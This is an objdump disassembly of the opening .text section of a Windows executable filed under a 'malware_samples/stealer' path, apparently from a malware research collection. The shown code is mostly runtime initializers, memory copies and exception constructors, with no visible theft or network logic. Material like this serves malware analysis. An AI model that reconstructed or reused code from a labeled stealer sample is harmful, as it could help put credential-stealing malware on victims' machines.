
malware_samples/stealer/af2944607c944ed96bc46b74caed3bea624dee465f36b74d776d4d59cdb2d73c.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 8d 0d 49 c1 07 00 	lea    0x7c149(%rip),%rcx        # 0x18007d150
   180001007:	e9 f4 57 01 00       	jmp    0x180016800
   18000100c:	cc                   	int3
   18000100d:	cc                   	int3
   18000100e:	cc                   	int3
   18000100f:	cc                   	int3
   180001010:	48 8d 0d 3a c1 07 00 	lea    0x7c13a(%rip),%rcx        # 0x18007d151
   180001017:	e9 e4 57 01 00       	jmp    0x180016800
   18000101c:	cc                   	int3
   18000101d:	cc                   	int3
   18000101e:	cc                   	int3
   18000101f:	cc                   	int3
   180001020:	48 8d 0d 2b c1 07 00 	lea    0x7c12b(%rip),%rcx        # 0x18007d152
   180001027:	e9 d4 57 01 00       	jmp    0x180016800
   18000102c:	cc                   	int3
   18000102d:	cc                   	int3
   18000102e:	cc                   	int3
   18000102f:	cc                   	int3
   180001030:	48 83 ec 28          	sub    $0x28,%rsp
   180001034:	b9 00 01 00 00       	mov    $0x100,%ecx
   180001039:	e8 a2 0f 00 00       	call   0x180001fe0
   18000103e:	66 0f 6f 05 0a ac 04 	movdqa 0x4ac0a(%rip),%xmm0        # 0x18004bc50
   180001045:	00 
   180001046:	48 8d 0d 23 8d 04 00 	lea    0x48d23(%rip),%rcx        # 0x180049d70
   18000104d:	f3 0f 7f 05 13 c1 07 	movdqu %xmm0,0x7c113(%rip)        # 0x18007d168
   180001054:	00 
   180001055:	48 89 05 fc c0 07 00 	mov    %rax,0x7c0fc(%rip)        # 0x18007d158
   18000105c:	4c 8b c0             	mov    %rax,%r8
   18000105f:	0f 10 01             	movups (%rcx),%xmm0
   180001062:	48 8d 90 80 00 00 00 	lea    0x80(%rax),%rdx
   180001069:	48 8d 89 80 00 00 00 	lea    0x80(%rcx),%rcx
   180001070:	0f 11 00             	movups %xmm0,(%rax)
   180001073:	0f 10 49 90          	movups -0x70(%rcx),%xmm1
   180001077:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   18000107b:	0f 10 41 a0          	movups -0x60(%rcx),%xmm0
   18000107f:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   180001083:	0f 10 49 b0          	movups -0x50(%rcx),%xmm1
   180001087:	0f 11 48 30          	movups %xmm1,0x30(%rax)
   18000108b:	0f 10 41 c0          	movups -0x40(%rcx),%xmm0
   18000108f:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   180001093:	0f 10 49 d0          	movups -0x30(%rcx),%xmm1
   180001097:	0f 11 48 50          	movups %xmm1,0x50(%rax)
   18000109b:	0f 10 41 e0          	movups -0x20(%rcx),%xmm0
   18000109f:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   1800010a3:	0f 10 41 f0          	movups -0x10(%rcx),%xmm0
   1800010a7:	0f 11 42 f0          	movups %xmm0,-0x10(%rdx)
   1800010ab:	0f 10 09             	movups (%rcx),%xmm1
   1800010ae:	0f 11 0a             	movups %xmm1,(%rdx)
   1800010b1:	0f 10 41 10          	movups 0x10(%rcx),%xmm0
   1800010b5:	0f 11 42 10          	movups %xmm0,0x10(%rdx)
   1800010b9:	0f 10 49 20          	movups 0x20(%rcx),%xmm1
   1800010bd:	0f 11 4a 20          	movups %xmm1,0x20(%rdx)
   1800010c1:	0f 10 41 30          	movups 0x30(%rcx),%xmm0
   1800010c5:	0f 11 42 30          	movups %xmm0,0x30(%rdx)
   1800010c9:	0f 10 49 40          	movups 0x40(%rcx),%xmm1
   1800010cd:	0f 11 4a 40          	movups %xmm1,0x40(%rdx)
   1800010d1:	0f 10 41 50          	movups 0x50(%rcx),%xmm0
   1800010d5:	0f 11 42 50          	movups %xmm0,0x50(%rdx)
   1800010d9:	0f 10 49 60          	movups 0x60(%rcx),%xmm1
   1800010dd:	0f 11 4a 60          	movups %xmm1,0x60(%rdx)
   1800010e1:	48 8b 41 70          	mov    0x70(%rcx),%rax
   1800010e5:	48 89 42 70          	mov    %rax,0x70(%rdx)
   1800010e9:	0f b7 41 78          	movzwl 0x78(%rcx),%eax
   1800010ed:	66 89 42 78          	mov    %ax,0x78(%rdx)
   1800010f1:	0f b6 41 7a          	movzbl 0x7a(%rcx),%eax
   1800010f5:	48 8d 0d 14 f3 03 00 	lea    0x3f314(%rip),%rcx        # 0x180040410
   1800010fc:	88 42 7a             	mov    %al,0x7a(%rdx)
   1800010ff:	41 c6 80 fb 00 00 00 	movb   $0x0,0xfb(%r8)
   180001106:	00 
   180001107:	48 83 c4 28          	add    $0x28,%rsp
   18000110b:	e9 28 de 03 00       	jmp    0x18003ef38
   180001110:	48 8d 0d 3c c0 07 00 	lea    0x7c03c(%rip),%rcx        # 0x18007d153
   180001117:	e9 e4 56 01 00       	jmp    0x180016800
   18000111c:	cc                   	int3
   18000111d:	cc                   	int3
   18000111e:	cc                   	int3
   18000111f:	cc                   	int3
   180001120:	48 8d 0d 2d c0 07 00 	lea    0x7c02d(%rip),%rcx        # 0x18007d154
   180001127:	e9 d4 56 01 00       	jmp    0x180016800
   18000112c:	cc                   	int3
   18000112d:	cc                   	int3
   18000112e:	cc                   	int3
   18000112f:	cc                   	int3
   180001130:	48 8d 0d e9 f2 03 00 	lea    0x3f2e9(%rip),%rcx        # 0x180040420
   180001137:	e9 fc dd 03 00       	jmp    0x18003ef38
   18000113c:	cc                   	int3
   18000113d:	cc                   	int3
   18000113e:	cc                   	int3
   18000113f:	cc                   	int3
   180001140:	48 8d 0d a9 f3 03 00 	lea    0x3f3a9(%rip),%rcx        # 0x1800404f0
   180001147:	e9 ec dd 03 00       	jmp    0x18003ef38
   18000114c:	cc                   	int3
   18000114d:	cc                   	int3
   18000114e:	cc                   	int3
   18000114f:	cc                   	int3
   180001150:	48 8b 05 51 b4 07 00 	mov    0x7b451(%rip),%rax        # 0x18007c5a8
   180001157:	48 89 05 fa c2 07 00 	mov    %rax,0x7c2fa(%rip)        # 0x18007d458
   18000115e:	c3                   	ret
   18000115f:	cc                   	int3
   180001160:	48 83 ec 28          	sub    $0x28,%rsp
   180001164:	48 8d 0d 95 a0 04 00 	lea    0x4a095(%rip),%rcx        # 0x18004b200
   18000116b:	ff 15 bf fe 03 00    	call   *0x3febf(%rip)        # 0x180041030
   180001171:	48 89 05 08 c0 07 00 	mov    %rax,0x7c008(%rip)        # 0x18007d180
   180001178:	48 83 c4 28          	add    $0x28,%rsp
   18000117c:	c3                   	ret
   18000117d:	cc                   	int3
   18000117e:	cc                   	int3
   18000117f:	cc                   	int3
   180001180:	48 83 ec 28          	sub    $0x28,%rsp
   180001184:	b9 20 00 00 00       	mov    $0x20,%ecx
   180001189:	e8 16 da 03 00       	call   0x18003eba4
   18000118e:	48 89 00             	mov    %rax,(%rax)
   180001191:	48 89 40 08          	mov    %rax,0x8(%rax)
   180001195:	48 89 05 fc c0 07 00 	mov    %rax,0x7c0fc(%rip)        # 0x18007d298
   18000119c:	48 c7 05 01 c1 07 00 	movq   $0x0,0x7c101(%rip)        # 0x18007d2a8
   1800011a3:	00 00 00 00 
   1800011a7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800011aa:	66 0f 7f 05 fe c0 07 	movdqa %xmm0,0x7c0fe(%rip)        # 0x18007d2b0
   1800011b1:	00 
   1800011b2:	48 c7 05 03 c1 07 00 	movq   $0x7,0x7c103(%rip)        # 0x18007d2c0
   1800011b9:	07 00 00 00 
   1800011bd:	48 c7 05 00 c1 07 00 	movq   $0x8,0x7c100(%rip)        # 0x18007d2c8
   1800011c4:	08 00 00 00 
   1800011c8:	c7 05 be c0 07 00 00 	movl   $0x3f800000,0x7c0be(%rip)        # 0x18007d290
   1800011cf:	00 80 3f 
   1800011d2:	4c 8b c0             	mov    %rax,%r8
   1800011d5:	48 8d 0d cc c0 07 00 	lea    0x7c0cc(%rip),%rcx        # 0x18007d2a8
   1800011dc:	e8 ff d0 03 00       	call   0x18003e2e0
   1800011e1:	90                   	nop
   1800011e2:	48 8d 0d 17 f3 03 00 	lea    0x3f317(%rip),%rcx        # 0x180040500
   1800011e9:	48 83 c4 28          	add    $0x28,%rsp
   1800011ed:	e9 46 dd 03 00       	jmp    0x18003ef38
   1800011f2:	cc                   	int3
   1800011f3:	cc                   	int3
   1800011f4:	cc                   	int3
   1800011f5:	cc                   	int3
   1800011f6:	cc                   	int3
   1800011f7:	cc                   	int3
   1800011f8:	cc                   	int3
   1800011f9:	cc                   	int3
   1800011fa:	cc                   	int3
   1800011fb:	cc                   	int3
   1800011fc:	cc                   	int3
   1800011fd:	cc                   	int3
   1800011fe:	cc                   	int3
   1800011ff:	cc                   	int3
   180001200:	48 8d 0d 59 f3 03 00 	lea    0x3f359(%rip),%rcx        # 0x180040560
   180001207:	e9 2c dd 03 00       	jmp    0x18003ef38
   18000120c:	cc                   	int3
   18000120d:	cc                   	int3
   18000120e:	cc                   	int3
   18000120f:	cc                   	int3
   180001210:	48 8d 0d c9 f3 03 00 	lea    0x3f3c9(%rip),%rcx        # 0x1800405e0
   180001217:	e9 1c dd 03 00       	jmp    0x18003ef38
   18000121c:	cc                   	int3
   18000121d:	cc                   	int3
   18000121e:	cc                   	int3
   18000121f:	cc                   	int3
   180001220:	48 8d 0d 39 f4 03 00 	lea    0x3f439(%rip),%rcx        # 0x180040660
   180001227:	e9 0c dd 03 00       	jmp    0x18003ef38
   18000122c:	cc                   	int3
   18000122d:	cc                   	int3
   18000122e:	cc                   	int3
   18000122f:	cc                   	int3
   180001230:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001235:	57                   	push   %rdi
   180001236:	48 83 ec 30          	sub    $0x30,%rsp
   18000123a:	b9 58 00 00 00       	mov    $0x58,%ecx
   18000123f:	e8 60 d9 03 00       	call   0x18003eba4
   180001244:	48 8b f8             	mov    %rax,%rdi
   180001247:	48 89 00             	mov    %rax,(%rax)
   18000124a:	48 89 40 08          	mov    %rax,0x8(%rax)
   18000124e:	48 89 05 d3 c0 07 00 	mov    %rax,0x7c0d3(%rip)        # 0x18007d328
   180001255:	48 c7 05 d8 c0 07 00 	movq   $0x0,0x7c0d8(%rip)        # 0x18007d338
   18000125c:	00 00 00 00 
   180001260:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001263:	66 0f 7f 05 d5 c0 07 	movdqa %xmm0,0x7c0d5(%rip)        # 0x18007d340
   18000126a:	00 
   18000126b:	48 c7 05 da c0 07 00 	movq   $0x7,0x7c0da(%rip)        # 0x18007d350
   180001272:	07 00 00 00 
   180001276:	48 c7 05 d7 c0 07 00 	movq   $0x8,0x7c0d7(%rip)        # 0x18007d358
   18000127d:	08 00 00 00 
   180001281:	c7 05 95 c0 07 00 00 	movl   $0x3f800000,0x7c095(%rip)        # 0x18007d320
   180001288:	00 80 3f 
   18000128b:	b9 80 00 00 00       	mov    $0x80,%ecx
   180001290:	e8 0f d9 03 00       	call   0x18003eba4
   180001295:	48 8b d8             	mov    %rax,%rbx
   180001298:	48 8b 15 a9 c0 07 00 	mov    0x7c0a9(%rip),%rdx        # 0x18007d348
   18000129f:	48 8b 0d 92 c0 07 00 	mov    0x7c092(%rip),%rcx        # 0x18007d338
   1800012a6:	48 2b d1             	sub    %rcx,%rdx
   1800012a9:	48 c1 fa 03          	sar    $0x3,%rdx
   1800012ad:	48 85 d2             	test   %rdx,%rdx
   1800012b0:	74 48                	je     0x1800012fa
   1800012b2:	48 8d 14 d5 00 00 00 	lea    0x0(,%rdx,8),%rdx
   1800012b9:	00 
   1800012ba:	48 8b c1             	mov    %rcx,%rax
   1800012bd:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800012c4:	72 2f                	jb     0x1800012f5
   1800012c6:	48 83 c2 27          	add    $0x27,%rdx
   1800012ca:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800012ce:	48 2b c1             	sub    %rcx,%rax
   1800012d1:	48 83 e8 08          	sub    $0x8,%rax
   1800012d5:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800012d9:	76 1a                	jbe    0x1800012f5
   1800012db:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1800012e2:	00 00 
   1800012e4:	45 33 c9             	xor    %r9d,%r9d
   1800012e7:	45 33 c0             	xor    %r8d,%r8d
   1800012ea:	33 d2                	xor    %edx,%edx
   1800012ec:	33 c9                	xor    %ecx,%ecx
   1800012ee:	ff 15 ac 01 04 00    	call   *0x401ac(%rip)        # 0x1800414a0
   1800012f4:	cc                   	int3
   1800012f5:	e8 5e dc 03 00       	call   0x18003ef58
   1800012fa:	48 89 1d 37 c0 07 00 	mov    %rbx,0x7c037(%rip)        # 0x18007d338
   180001301:	48 8d 83 80 00 00 00 	lea    0x80(%rbx),%rax
   180001308:	48 89 05 31 c0 07 00 	mov    %rax,0x7c031(%rip)        # 0x18007d340
   18000130f:	48 89 05 32 c0 07 00 	mov    %rax,0x7c032(%rip)        # 0x18007d348
   180001316:	48 3b d8             	cmp    %rax,%rbx
   180001319:	74 11                	je     0x18000132c
   18000131b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001320:	48 89 3b             	mov    %rdi,(%rbx)
   180001323:	48 83 c3 08          	add    $0x8,%rbx
   180001327:	48 3b d8             	cmp    %rax,%rbx
   18000132a:	75 f4                	jne    0x180001320
   18000132c:	48 8d 0d ad f3 03 00 	lea    0x3f3ad(%rip),%rcx        # 0x1800406e0
   180001333:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180001338:	48 83 c4 30          	add    $0x30,%rsp
   18000133c:	5f                   	pop    %rdi
   18000133d:	e9 f6 db 03 00       	jmp    0x18003ef38
   180001342:	cc                   	int3
   180001343:	cc                   	int3
   180001344:	cc                   	int3
   180001345:	cc                   	int3
   180001346:	cc                   	int3
   180001347:	cc                   	int3
   180001348:	cc                   	int3
   180001349:	cc                   	int3
   18000134a:	cc                   	int3
   18000134b:	cc                   	int3
   18000134c:	cc                   	int3
   18000134d:	cc                   	int3
   18000134e:	cc                   	int3
   18000134f:	cc                   	int3
   180001350:	48 83 ec 28          	sub    $0x28,%rsp
   180001354:	48 8d 0d a5 9e 04 00 	lea    0x49ea5(%rip),%rcx        # 0x18004b200
   18000135b:	ff 15 cf fc 03 00    	call   *0x3fccf(%rip)        # 0x180041030
   180001361:	48 89 05 10 be 07 00 	mov    %rax,0x7be10(%rip)        # 0x18007d178
   180001368:	48 83 c4 28          	add    $0x28,%rsp
   18000136c:	c3                   	ret
   18000136d:	cc                   	int3
   18000136e:	cc                   	int3
   18000136f:	cc                   	int3
   180001370:	48 8d 0d a1 a3 04 00 	lea    0x4a3a1(%rip),%rcx        # 0x18004b718
   180001377:	48 ff 25 b2 fc 03 00 	rex.W jmp *0x3fcb2(%rip)        # 0x180041030
   18000137e:	cc                   	int3
   18000137f:	cc                   	int3
   180001380:	48 83 ec 28          	sub    $0x28,%rsp
   180001384:	b9 20 00 00 00       	mov    $0x20,%ecx
   180001389:	e8 52 0c 00 00       	call   0x180001fe0
   18000138e:	66 0f 6f 05 aa a8 04 	movdqa 0x4a8aa(%rip),%xmm0        # 0x18004bc40
   180001395:	00 
   180001396:	48 8b d0             	mov    %rax,%rdx
   180001399:	f3 0f 7f 05 f7 bd 07 	movdqu %xmm0,0x7bdf7(%rip)        # 0x18007d198
   1800013a0:	00 
   1800013a1:	48 89 05 e0 bd 07 00 	mov    %rax,0x7bde0(%rip)        # 0x18007d188
   1800013a8:	0f 10 05 79 a3 04 00 	movups 0x4a379(%rip),%xmm0        # 0x18004b728
   1800013af:	0f 11 00             	movups %xmm0,(%rax)
   1800013b2:	8b 0d 80 a3 04 00    	mov    0x4a380(%rip),%ecx        # 0x18004b738
   1800013b8:	89 48 10             	mov    %ecx,0x10(%rax)
   1800013bb:	0f b7 0d 7a a3 04 00 	movzwl 0x4a37a(%rip),%ecx        # 0x18004b73c
   1800013c2:	66 89 48 14          	mov    %cx,0x14(%rax)
   1800013c6:	48 8d 0d 33 f3 03 00 	lea    0x3f333(%rip),%rcx        # 0x180040700
   1800013cd:	0f b6 05 6a a3 04 00 	movzbl 0x4a36a(%rip),%eax        # 0x18004b73e
   1800013d4:	88 42 16             	mov    %al,0x16(%rdx)
   1800013d7:	c6 42 17 00          	movb   $0x0,0x17(%rdx)
   1800013db:	48 83 c4 28          	add    $0x28,%rsp
   1800013df:	e9 54 db 03 00       	jmp    0x18003ef38
   1800013e4:	cc                   	int3
   1800013e5:	cc                   	int3
   1800013e6:	cc                   	int3
   1800013e7:	cc                   	int3
   1800013e8:	cc                   	int3
   1800013e9:	cc                   	int3
   1800013ea:	cc                   	int3
   1800013eb:	cc                   	int3
   1800013ec:	cc                   	int3
   1800013ed:	cc                   	int3
   1800013ee:	cc                   	int3
   1800013ef:	cc                   	int3
   1800013f0:	48 8d 0d 5e bd 07 00 	lea    0x7bd5e(%rip),%rcx        # 0x18007d155
   1800013f7:	e9 04 54 01 00       	jmp    0x180016800
   1800013fc:	cc                   	int3
   1800013fd:	cc                   	int3
   1800013fe:	cc                   	int3
   1800013ff:	cc                   	int3
   180001400:	40 53                	rex push %rbx
   180001402:	48 83 ec 20          	sub    $0x20,%rsp
   180001406:	48 8b d9             	mov    %rcx,%rbx
   180001409:	48 8b c2             	mov    %rdx,%rax
   18000140c:	48 8d 0d 9d 02 04 00 	lea    0x4029d(%rip),%rcx        # 0x1800416b0
   180001413:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001416:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000141a:	48 89 0b             	mov    %rcx,(%rbx)
   18000141d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001421:	0f 11 02             	movups %xmm0,(%rdx)
   180001424:	ff 15 56 ff 03 00    	call   *0x3ff56(%rip)        # 0x180041380
   18000142a:	48 8b c3             	mov    %rbx,%rax
   18000142d:	48 83 c4 20          	add    $0x20,%rsp
   180001431:	5b                   	pop    %rbx
   180001432:	c3                   	ret
   180001433:	cc                   	int3
   180001434:	cc                   	int3
   180001435:	cc                   	int3
   180001436:	cc                   	int3
   180001437:	cc                   	int3
   180001438:	cc                   	int3
   180001439:	cc                   	int3
   18000143a:	cc                   	int3
   18000143b:	cc                   	int3
   18000143c:	cc                   	int3
   18000143d:	cc                   	int3
   18000143e:	cc                   	int3
   18000143f:	cc                   	int3
   180001440:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180001444:	48 8d 05 b5 02 04 00 	lea    0x402b5(%rip),%rax        # 0x180041700
   18000144b:	48 85 d2             	test   %rdx,%rdx
   18000144e:	48 0f 45 c2          	cmovne %rdx,%rax
   180001452:	c3                   	ret
   180001453:	cc                   	int3
   180001454:	cc                   	int3
   180001455:	cc                   	int3
   180001456:	cc                   	int3
   180001457:	cc                   	int3
   180001458:	cc                   	int3
   180001459:	cc                   	int3
   18000145a:	cc                   	int3
   18000145b:	cc                   	int3
   18000145c:	cc                   	int3
   18000145d:	cc                   	int3
   18000145e:	cc                   	int3
   18000145f:	cc                   	int3
   180001460:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001465:	57                   	push   %rdi
   180001466:	48 83 ec 20          	sub    $0x20,%rsp
   18000146a:	48 8d 05 3f 02 04 00 	lea    0x4023f(%rip),%rax        # 0x1800416b0
   180001471:	48 8b f9             	mov    %rcx,%rdi
   180001474:	48 89 01             	mov    %rax,(%rcx)
   180001477:	8b da                	mov    %edx,%ebx
   180001479:	48 83 c1 08          	add    $0x8,%rcx
   18000147d:	ff 15 05 ff 03 00    	call   *0x3ff05(%rip)        # 0x180041388
   180001483:	f6 c3 01             	test   $0x1,%bl
   180001486:	74 0d                	je     0x180001495
   180001488:	ba 18 00 00 00       	mov    $0x18,%edx
   18000148d:	48 8b cf             	mov    %rdi,%rcx
   180001490:	e8 c3 da 03 00       	call   0x18003ef58
   180001495:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000149a:	48 8b c7             	mov    %rdi,%rax
   18000149d:	48 83 c4 20          	add    $0x20,%rsp
   1800014a1:	5f                   	pop    %rdi
   1800014a2:	c3                   	ret
   1800014a3:	cc                   	int3
   1800014a4:	cc                   	int3
   1800014a5:	cc                   	int3
   1800014a6:	cc                   	int3
   1800014a7:	cc                   	int3
   1800014a8:	cc                   	int3
   1800014a9:	cc                   	int3
   1800014aa:	cc                   	int3
   1800014ab:	cc                   	int3
   1800014ac:	cc                   	int3
   1800014ad:	cc                   	int3
   1800014ae:	cc                   	int3
   1800014af:	cc                   	int3
   1800014b0:	48 8d 05 f9 01 04 00 	lea    0x401f9(%rip),%rax        # 0x1800416b0
   1800014b7:	48 89 01             	mov    %rax,(%rcx)
   1800014ba:	48 83 c1 08          	add    $0x8,%rcx
   1800014be:	48 ff 25 c3 fe 03 00 	rex.W jmp *0x3fec3(%rip)        # 0x180041388
   1800014c5:	cc                   	int3
   1800014c6:	cc                   	int3
   1800014c7:	cc                   	int3
   1800014c8:	cc                   	int3
   1800014c9:	cc                   	int3
   1800014ca:	cc                   	int3
   1800014cb:	cc                   	int3
   1800014cc:	cc                   	int3
   1800014cd:	cc                   	int3
   1800014ce:	cc                   	int3
   1800014cf:	cc                   	int3
   1800014d0:	48 8d 05 41 02 04 00 	lea    0x40241(%rip),%rax        # 0x180041718
   1800014d7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1800014de:	00 
   1800014df:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800014e3:	48 8d 05 06 02 04 00 	lea    0x40206(%rip),%rax        # 0x1800416f0
   1800014ea:	48 89 01             	mov    %rax,(%rcx)
   1800014ed:	48 8b c1             	mov    %rcx,%rax
   1800014f0:	c3                   	ret
   1800014f1:	cc                   	int3
   1800014f2:	cc                   	int3
   1800014f3:	cc                   	int3
   1800014f4:	cc                   	int3
   1800014f5:	cc                   	int3
   1800014f6:	cc                   	int3
   1800014f7:	cc                   	int3
   1800014f8:	cc                   	int3
   1800014f9:	cc                   	int3
   1800014fa:	cc                   	int3
   1800014fb:	cc                   	int3
   1800014fc:	cc                   	int3
   1800014fd:	cc                   	int3
   1800014fe:	cc                   	int3
   1800014ff:	cc                   	int3
   180001500:	48 83 ec 48          	sub    $0x48,%rsp
   180001504:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001509:	e8 c2 ff ff ff       	call   0x1800014d0
   18000150e:	48 8d 15 b3 fe 04 00 	lea    0x4feb3(%rip),%rdx        # 0x1800513c8
   180001515:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000151a:	e8 4f e6 03 00       	call   0x18003fb6e
   18000151f:	cc                   	int3
   180001520:	40 53                	rex push %rbx
   180001522:	48 83 ec 20          	sub    $0x20,%rsp
   180001526:	48 8b d9             	mov    %rcx,%rbx
   180001529:	48 8b c2             	mov    %rdx,%rax
   18000152c:	48 8d 0d 7d 01 04 00 	lea    0x4017d(%rip),%rcx        # 0x1800416b0
   180001533:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001536:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000153a:	48 89 0b             	mov    %rcx,(%rbx)
   18000153d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001541:	0f 11 02             	movups %xmm0,(%rdx)
   180001544:	ff 15 36 fe 03 00    	call   *0x3fe36(%rip)        # 0x180041380
   18000154a:	48 8d 05 9f 01 04 00 	lea    0x4019f(%rip),%rax        # 0x1800416f0
   180001551:	48 89 03             	mov    %rax,(%rbx)
   180001554:	48 8b c3             	mov    %rbx,%rax
   180001557:	48 83 c4 20          	add    $0x20,%rsp
   18000155b:	5b                   	pop    %rbx
   18000155c:	c3                   	ret
   18000155d:	cc                   	int3
   18000155e:	cc                   	int3
   18000155f:	cc                   	int3
   180001560:	40 53                	rex push %rbx
   180001562:	48 83 ec 20          	sub    $0x20,%rsp
   180001566:	48 8b d9             	mov    %rcx,%rbx
   180001569:	48 8b c2             	mov    %rdx,%rax
   18000156c:	48 8d 0d 3d 01 04 00 	lea    0x4013d(%rip),%rcx        # 0x1800416b0
   180001573:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001576:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000157a:	48 89 0b             	mov    %rcx,(%rbx)
   18000157d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001581:	0f 11 02             	movups %xmm0,(%rdx)
   180001584:	ff 15 f6 fd 03 00    	call   *0x3fdf6(%rip)        # 0x180041380
   18000158a:	48 8d 05 37 01 04 00 	lea    0x40137(%rip),%rax        # 0x1800416c8
   180001591:	48 89 03             	mov    %rax,(%rbx)
   180001594:	48 8b c3             	mov    %rbx,%rax
   180001597:	48 83 c4 20          	add    $0x20,%rsp
   18000159b:	5b                   	pop    %rbx
   18000159c:	c3                   	ret
   18000159d:	cc                   	int3
   18000159e:	cc                   	int3
   18000159f:	cc                   	int3
   1800015a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800015a4:	48 8d 0d 85 01 04 00 	lea    0x40185(%rip),%rcx        # 0x180041730
   1800015ab:	ff 15 27 fc 03 00    	call   *0x3fc27(%rip)        # 0x1800411d8
   1800015b1:	cc                   	int3
   1800015b2:	cc                   	int3
   1800015b3:	cc                   	int3
   1800015b4:	cc                   	int3
   1800015b5:	cc                   	int3
   1800015b6:	cc                   	int3
   1800015b7:	cc                   	int3
   1800015b8:	cc                   	int3
   1800015b9:	cc                   	int3
   1800015ba:	cc                   	int3
   1800015bb:	cc                   	int3
   1800015bc:	cc                   	int3
   1800015bd:	cc                   	int3
   1800015be:	cc                   	int3
   1800015bf:	cc                   	int3
   1800015c0:	48 8b c4             	mov    %rsp,%rax
   1800015c3:	48 89 58 18          	mov    %rbx,0x18(%rax)
   1800015c7:	55                   	push   %rbp
   1800015c8:	56                   	push   %rsi
   1800015c9:	57                   	push   %rdi
   1800015ca:	41 54                	push   %r12
   1800015cc:	41 55                	push   %r13
   1800015ce:	41 56                	push   %r14
   1800015d0:	41 57                	push   %r15
   1800015d2:	48 8d 68 a8          	lea    -0x58(%rax),%rbp
   1800015d6:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
   1800015dd:	0f 29 70 b8          	movaps %xmm6,-0x48(%rax)
   1800015e1:	0f 29 78 a8          	movaps %xmm7,-0x58(%rax)
   1800015e5:	44 0f 29 40 98       	movaps %xmm8,-0x68(%rax)
   1800015ea:	44 0f 29 48 88       	movaps %xmm9,-0x78(%rax)
   1800015ef:	44 0f 29 98 78 ff ff 	movaps %xmm11,-0x88(%rax)
   1800015f6:	ff 
   1800015f7:	44 0f 29 a0 68 ff ff 	movaps %xmm12,-0x98(%rax)
   1800015fe:	ff 
   1800015ff:	44 0f 29 a8 58 ff ff 	movaps %xmm13,-0xa8(%rax)
   180001606:	ff 
   180001607:	44 0f 29 b0 48 ff ff 	movaps %xmm14,-0xb8(%rax)
   18000160e:	ff 
   18000160f:	48 8b 05 2a 1a 05 00 	mov    0x51a2a(%rip),%rax        # 0x180053040
   180001616:	48 33 c4             	xor    %rsp,%rax
   180001619:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   18000161d:	4c 8b e2             	mov    %rdx,%r12
   180001620:	4c 8b f1             	mov    %rcx,%r14
   180001623:	48 8b 1d a6 b7 07 00 	mov    0x7b7a6(%rip),%rbx        # 0x18007cdd0
   18000162a:	48 8b f3             	mov    %rbx,%rsi
   18000162d:	48 8b 83 18 1a 00 00 	mov    0x1a18(%rbx),%rax
   180001634:	c6 80 80 00 00 00 01 	movb   $0x1,0x80(%rax)
   18000163b:	4c 8b bb 18 1a 00 00 	mov    0x1a18(%rbx),%r15
   180001642:	41 80 bf 83 00 00 00 	cmpb   $0x0,0x83(%r15)
   180001649:	00 
   18000164a:	0f 85 5d 06 00 00    	jne    0x180001cad
   180001650:	41 83 bf c0 00 00 00 	cmpl   $0x0,0xc0(%r15)
   180001657:	00 
   180001658:	7f 21                	jg     0x18000167b
   18000165a:	41 b8 02 05 00 00    	mov    $0x502,%r8d
   180001660:	48 8d 15 e9 00 04 00 	lea    0x400e9(%rip),%rdx        # 0x180041750
   180001667:	48 8d 0d 02 2d 04 00 	lea    0x42d02(%rip),%rcx        # 0x180044370
   18000166e:	ff 15 1c fe 03 00    	call   *0x3fe1c(%rip)        # 0x180041490
   180001674:	48 8b 1d 55 b7 07 00 	mov    0x7b755(%rip),%rbx        # 0x18007cdd0
   18000167b:	49 63 87 c0 00 00 00 	movslq 0xc0(%r15),%rax
   180001682:	4d 8b 87 c8 00 00 00 	mov    0xc8(%r15),%r8
   180001689:	45 8b 44 80 fc       	mov    -0x4(%r8,%rax,4),%r8d
   18000168e:	33 d2                	xor    %edx,%edx
   180001690:	49 8b ce             	mov    %r14,%rcx
   180001693:	e8 68 1d 00 00       	call   0x180003400
   180001698:	8b f8                	mov    %eax,%edi
   18000169a:	39 83 60 1a 00 00    	cmp    %eax,0x1a60(%rbx)
   1800016a0:	75 06                	jne    0x1800016a8
   1800016a2:	89 83 64 1a 00 00    	mov    %eax,0x1a64(%rbx)
   1800016a8:	39 bb 9c 1a 00 00    	cmp    %edi,0x1a9c(%rbx)
   1800016ae:	75 07                	jne    0x1800016b7
   1800016b0:	c6 83 a0 1a 00 00 01 	movb   $0x1,0x1aa0(%rbx)
   1800016b7:	49 8b ce             	mov    %r14,%rcx
   1800016ba:	49 83 fe ff          	cmp    $0xffffffffffffffff,%r14
   1800016be:	73 1d                	jae    0x1800016dd
   1800016c0:	0f b6 11             	movzbl (%rcx),%edx
   1800016c3:	84 d2                	test   %dl,%dl
   1800016c5:	74 16                	je     0x1800016dd
   1800016c7:	48 8d 41 01          	lea    0x1(%rcx),%rax
